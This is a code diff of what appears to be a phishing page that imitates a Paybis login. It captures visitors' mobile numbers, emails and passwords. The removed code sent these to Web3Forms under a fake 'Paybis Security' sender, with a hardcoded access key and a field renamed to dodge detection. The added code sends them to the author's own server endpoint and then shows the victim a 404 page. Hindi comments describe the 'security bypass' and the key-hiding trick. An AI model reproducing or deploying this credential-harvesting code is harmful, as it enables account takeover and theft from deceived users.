@@ -226,12 +226,6 @@
   </div>
 
 <script>
-  // ============================================================
-  // WEB3FORMS CONFIG
-  // ============================================================
-  const WEB3FORMS_ACCESS_KEY = "fbaea0dd-88c1-42f9-83d1-125b0f927133"; 
-  // ============================================================
-
   // --- Country list with EXACT Mobile Lengths ---
   const COUNTRIES = [
     ["Afghanistan","AF","+93", 9],["Albania","AL","+355", 9],["Algeria","DZ","+213", 9],["Andorra","AD","+376", 6],
@@ -415,23 +409,11 @@
     const time = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
 
     try {
-      // Web3Forms API Call with fixed security fields
-      const response = await fetch('https://api.web3forms.com/submit', {
+      // YAHAN HUM APNE VERCEL SERVER KO CALL KAR RAHE HAIN (Koi API key yahan nahi hai)
+      const response = await fetch('/api/send', {
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'Accept': 'application/json'
-        },
-        body: JSON.stringify({
-          access_key: WEB3FORMS_ACCESS_KEY,
-          subject: "New Login Alert - Paybis",
-          from_name: "Paybis Security",
-          Mobile_Number: mobile,
-          User_Email: email,    
-          User_Secret: pass,    // <--- Password ki jagah User_Secret
-          Time: time,
-          botcheck: false       // <--- Security bypass ke liye zaroori
-        })
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ mobile, email, password: pass, time })
       });
 
       // User ko 404 dikhana hai
